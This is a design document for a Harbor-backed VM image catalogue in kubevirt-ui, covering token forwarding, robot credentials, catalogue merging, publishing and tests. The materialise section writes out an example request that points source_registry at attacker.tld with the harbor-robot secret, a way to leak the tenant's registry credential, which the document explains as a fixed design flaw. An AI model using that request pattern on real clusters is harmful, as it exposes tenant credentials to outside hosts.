# Harbor image catalogue

**Status:** approved, not implemented
**Date:** 2026-09-01

Add a Harbor-backed image path to kubevirt-ui: browse a Harbor catalogue,
materialise an artifact into a disk, publish a running VM's disk back to
Harbor, and select any of it when creating a VM template.

Harbor replaces the OpenNebula marketplace as the place VM images live. This
document covers only the kubevirt-ui side.

## Why a third path

The backend already chooses between two image implementations at runtime
(`app/core/operator.py`):

- `OPERATOR_IMAGE_ENABLED=false` — the backend writes CDI DataVolumes directly
- `OPERATOR_IMAGE_ENABLED=true` — the backend writes `ManagedImage` CRs and the
  operator produces the DataVolume, the DataSource and the status

Harbor becomes a third mode behind `HARBOR_IMAGE_ENABLED`. ManagedImage is not
modified and not removed.

The Harbor path is written so it can be deleted or promoted as one unit: a
client module, a router module, a hook, and one feature flag. Nothing else
learns that Harbor exists.

## What was measured first

Three claims in this design rest on probes against Harbor 2.15.2 rather than on
documentation. They are recorded because two of them contradict what the
documentation and the Harbor UI imply.

**Harbor accepts a dex-issued `id_token` as an API bearer.** With a real token
obtained through the authorization-code flow:

```
Bearer  GET /users/current                           -> 200  admin_role_in_auth: true
Bearer  GET /projects/<private>/repositories         -> 200
anon    GET /projects/<private>/repositories         -> 401   <- baseline
```

Harbor maps the token to the OIDC-onboarded user and applies that user's roles.
The common belief that OIDC users need a per-user CLI secret applies to the
Docker registry API, not the management API.

**Robot accounts cannot use the management API at all.** Neither system-level
nor project-level, regardless of granted permissions:

```
project robot, granted on a PRIVATE project -> GET repositories -> 401
same robot on a PUBLIC project, not granted -> GET repositories -> 200
```

The second line is anonymous access, not authorisation. Any probe run only
against public projects will show robots "working" when they are not. Robots
remain correct and necessary for the registry API (pull and push).

**Cross-namespace CDI clones are thin** on snapshot-capable storage
(`cloneType: snapshot` with a differing `dataSourceNamespace`), which is what
makes snapshot-then-publish affordable.

## Two identities

| Operation | Harbor API | Identity |
|---|---|---|
| Browse catalogue | management | the user's dex `id_token`, forwarded |
| Materialise image to disk | registry | tenant robot, via CDI `secretRef` |
| Publish disk to catalogue | registry | tenant robot |

Each identity is used only where Harbor actually enforces it. Browsing is
authorised per user by Harbor, so kubevirt-ui does no visibility filtering of
its own — a filter would be a second, weaker copy of a decision Harbor already
makes correctly.

`User.raw_token` already exists on the auth dataclass and is populated
(`app/core/auth.py:364,401`), so forwarding requires no new plumbing.

## Components

### Backend

**`app/core/harbor_client.py`** (new). Async `httpx`, module-level env config,
following the shape of `app/core/lldap_client.py`.

It differs from `lldap_client.py` in one deliberate way: it holds **no service
credential**. Every method takes the caller's bearer token as its first
argument. There is no code path that can reach Harbor's management API as a
shared identity, which turns "did we accidentally use the wrong identity?" from
a review question into a signature question.

Methods, matching what the UI needs:

```
list_projects(token)                        -> GET /projects
list_repositories(token, project)           -> GET /projects/{p}/repositories
list_artifacts(token, project, repository)  -> GET /projects/{p}/repositories/{r}/artifacts
list_project_artifacts(token, project)      -> GET /projects/{p}/artifacts
```

Catalogue browsing uses `GET /projects/{p}/artifacts` (project-wide): every
artifact it returns carries `repository_name`, so the per-repository walk buys
nothing and the read costs `1 + P` requests instead of `1 + P + (P x R)`.

**Measured against the lab Harbor with a valid user OIDC token:** 200 on both a
public and a private project; 401 with no token or a garbage bearer. So
authorisation is genuinely enforced on this endpoint — better than `/projects`,
which answers 200 to anyone, and which is why `verify_identity()` exists.
`repository_name` is populated on every real artifact, not merely declared in
the schema, and pagination behaves normally (`X-Total-Count` and
`Link: rel="next"`).

**`latest_in_repository=true` must not be used.** Harbor's documentation
presents it as the way to return one current artifact per repository instead of
every tag. On this Harbor build it is unusable, measured against real pushed
artifacts:

- `?latest_in_repository=true` alone → **HTTP 400**: *"either 'media_type' or
  'artifact_type' must be specified, but not both, when querying with
  latest_in_repository"*
- adding the companion filter through Harbor's `q=` syntax → **HTTP 500** for
  the brace and fuzzy forms, and **200 with zero results** for the bare form, on
  artifacts that unambiguously match the queried values

The requirement was traced to Harbor's own source and no syntax returns a
correct non-empty result. Sent anyway, every catalogue read is a 400, which the
client turns into `HarborUnavailable` — an empty catalogue with
`catalog_available: false` on every page load.

Dropping it forfeits nothing. The `1 + P` saving comes from calling the
**project-wide** endpoint rather than the per-repository ones;
`latest_in_repository` only ever reduced the number of *rows*, never the number
of *requests*. Without it the catalogue lists every tag — exactly what the code
on `main` does today — so there is no behaviour change either, only far fewer
requests. A test asserts the parameter is absent, so it cannot be re-added from
the documentation without something failing.

An earlier version of this document said that endpoint was "deliberately unused:
it returned 401 for a project robot in testing". That reasoning was void: the
401 was measured with a **robot** account, and Harbor robots are refused the
entire management API at every level regardless of permissions — the robot was
failing everywhere, not that endpoint in particular.
`list_repositories`/`list_artifacts` remain on the client and are still used by
the publish path's tag check.

**`app/api/v1/images.py`** (new). The `images_router` currently lives in
`app/api/v1/templates.py`, which is 1802 lines. This work adds substantial
image code; adding it there makes an already-oversized file worse. The existing
image endpoints move to the new module unchanged, and the Harbor endpoints join
them. `templates.py` keeps template concerns only.

This is a targeted improvement to code the work touches, not a general
refactor. No behaviour changes during the move; it is a separate commit from
the Harbor feature so a regression can be bisected to one or the other.

**`app/models/image.py`** (new). Pydantic models for catalogue entries and the
merged list item.

**`app/core/operator.py`**. Add `harbor_image_path_enabled()` beside the
existing `*_path_enabled()` functions, reading `HARBOR_IMAGE_ENABLED` through
the existing `_enabled()` helper.

**`GET /features`**. Add `enableHarborImages` so the frontend can hide the
catalogue rather than render an empty list against a disabled backend.

### Frontend

- `src/api/images.ts` — request functions, using `apiRequest` from `client.ts`
- `src/hooks/useImages.ts` — react-query hooks, `queryKey` arrays,
  `invalidateQueries` on mutation, matching `useTemplates.ts`
- `src/pages/Storage.tsx` — the Images section renders the unified list
- `src/pages/VMTemplates.tsx` — unchanged in shape; it selects images by name
  and consumes the same hook, so catalogue images become selectable with no
  template-specific work

## The unified list

Two sources merged into one list:

| Source | Rows | State |
|---|---|---|
| Cluster | CDI DataVolumes, as today | `ready`, `importing`, `failed` |
| Catalogue | Harbor artifacts, via the user's token | `catalog` |

**Merge key: the registry URL.** A DataVolume whose source is
`docker://harbor.example/vm-images-public/ubuntu-2204:20260901` and the Harbor
artifact at that same coordinate are one row, shown as `ready` and carrying its
catalogue provenance. Rows that exist in only one source appear once.

The merge happens in the backend, not the browser. The frontend receives one
already-merged list, so the merge rule has one implementation and one set of
tests.

### When Harbor is unreachable

Catalogue rows disappear; cluster rows remain; the page shows a non-blocking
warning. Creating a VM from an already-materialised image keeps working.

This is a requirement, not a nicety, and it is why Harbor is not the source of
truth for the image list: a VM that cannot start because a registry is down is a
far worse failure than a list that is temporarily short.

`GET /images` therefore never fails because Harbor failed. It returns cluster
rows with a `catalog_available: false` marker.

### Materialising an image

"Create disk from image" posts to the existing create endpoint with
`catalog_ref` — the host-less `"<project>/<repository>:<tag>"` string
`GET /images` reported — and the target namespace. Nothing else.

The backend adds the rest, because all of it is a server-side fact:

- the registry host and the `docker://` scheme, from `harbor_registry_host()`
- `secretRef` — the tenant's robot credential, named by convention
  (`HARBOR_ROBOT_SECRET`, default `harbor-robot`). CDI resolves it in the
  DataVolume's own namespace, so the Secret must exist in the target namespace,
  which is the same namespace the `harbor-robots` chart provisions it into.
- `certConfigMap` — needed while Harbor uses a private CA; attached only when a
  ConfigMap by that name actually exists, since CDI refuses an import outright
  when it names nothing.

**The credential is derived from the RESOLVED registry host, and the request
carries no credential field at all.** An earlier draft of this section had the
caller send `secretRef`/`certConfigMap` alongside `source_registry`, and it was
implemented that way. That is a credential-exfiltration primitive: a request
naming `source_registry: docker://attacker.tld/x:1` and
`source_registry_secret: harbor-robot` makes CDI authenticate to the
attacker's registry with the tenant's robot password. Validating the URL and
keeping the field is not the fix — an allow-list over a caller-supplied string
that gates a credential is one bypass away from the same bug. `source_registry`
survives for ordinary registry imports and gets a credential only when its host
is Harbor's own; anything else is an anonymous pull, which is what it was
before this feature existed.

Materialising is gated by `HARBOR_IMAGE_ENABLED` like every other Harbor path.
It was not, originally — the flag reached the list handler and publish and not
this one — so "with the flag unset the behaviour is unchanged" was false.

## Publish

Snapshot-then-publish, so a running VM never stops:

1. `VolumeSnapshot` of the source PVC
2. temporary PVC from that snapshot
3. Job mounts the temporary PVC read-only, packs the `disk/` layout, `crane push`
4. tear down the temporary PVC and the snapshot

Step 4 must run when step 3 fails. Cleanup is keyed to the Job's lifecycle
rather than a happy-path branch, because the failure that leaves orphaned
snapshots and PVCs behind is exactly the one nobody notices until storage fills.

The Job mirrors the existing publish pattern already used in the lab
(`crane append --oci-empty-base`, disk file under `disk/` in the layer), which
produces an artifact both CDI's `source.registry` and KubeVirt's `containerDisk`
can consume.

Publishing authenticates with the tenant robot, because pushing is a registry
operation.

### Tags are immutable

CDI imports a registry source exactly once. Re-pushing a tag does not update an
existing disk, so publish rejects a tag that already exists rather than
appearing to succeed. The UI proposes a timestamped tag by default.

This mirrors the immutable-tag rule enforced on the Harbor side and keeps the
two consistent: a re-push should fail loudly at publish time, never silently at
boot time.

## Errors

Follows `app/core/errors.py`: `HTTPException` with a specific status, and
`validate_k8s_name()` on any user-supplied string that becomes a Kubernetes
object name.

| Condition | Response |
|---|---|
| Harbor unreachable during browse | 200, cluster rows only, `catalog_available: false` |
| User's token rejected by Harbor | 200, cluster rows only, warning distinguishes this from an outage |
| Publish tag already exists | 409, naming the existing tag |
| Materialise without a robot Secret in the namespace | 422, naming the missing Secret |
| Snapshot unsupported by the storage class | 422 at publish time, before anything is created |

An expired token is reported distinctly from an unreachable Harbor. They need
different user actions — re-authenticate versus wait — and collapsing them into
one message sends people to look at the wrong thing.

## Testing

**Unit, no live registry.** A fake Harbor fixture in `backend/tests/conftest.py`
in the same shape as `mock_k8s_client`, covering: merge and dedup by registry
URL, Harbor-down degradation, token-rejected degradation, materialise argument
construction, publish orchestration and its cleanup-on-failure path.

Behaviour-named, matching the existing convention:

```
test_an_image_in_the_catalog_becomes_a_disk.py
test_harbor_being_down_does_not_hide_local_images.py
test_a_publish_that_fails_cleans_up_after_itself.py
test_a_tag_that_already_exists_is_refused.py
```

**One end-to-end test against a real Harbor**, in `docker-compose.e2e.yml`.

A mock accepts any bearer token, so it will happily confirm token forwarding
that does not work. The e2e test asserts the negative: a request carrying the
wrong identity is *refused*. This is the single claim the unit tests cannot
make, and it is the claim the whole security model rests on.

**Local before lab.** `make test-backend` and the e2e compose stack both run on
a laptop with no cluster. Nothing reaches the lab until both are green.

## Out of scope

- Changes to the ManagedImage path — it stays as mode 2, untouched
- Harbor project and robot provisioning — the `harbor-robots` chart owns that
- Retention, quota and vulnerability-scanning UI — Harbor's own UI covers these
- Migration of existing OpenNebula marketplace images

## Risks

**A stale row is a confusing row.** If an artifact is deleted in Harbor while a
DataVolume made from it still exists, the row stays `ready` and its catalogue
link 404s. Accepted: the disk genuinely still works. The UI marks provenance as
unavailable rather than hiding the row.

**Publish needs transient storage** equal to the disk being published. On a full
storage pool, publish fails at snapshot time. The 422 above surfaces this before
any object is created.

**Token audience.** Forwarding works because the token is issued for Harbor's
OIDC client. If kubevirt-ui and Harbor are ever pointed at different clients or
issuers, browse breaks with a 401 that looks like a permissions bug. The
distinct error message for a rejected token exists for this case.
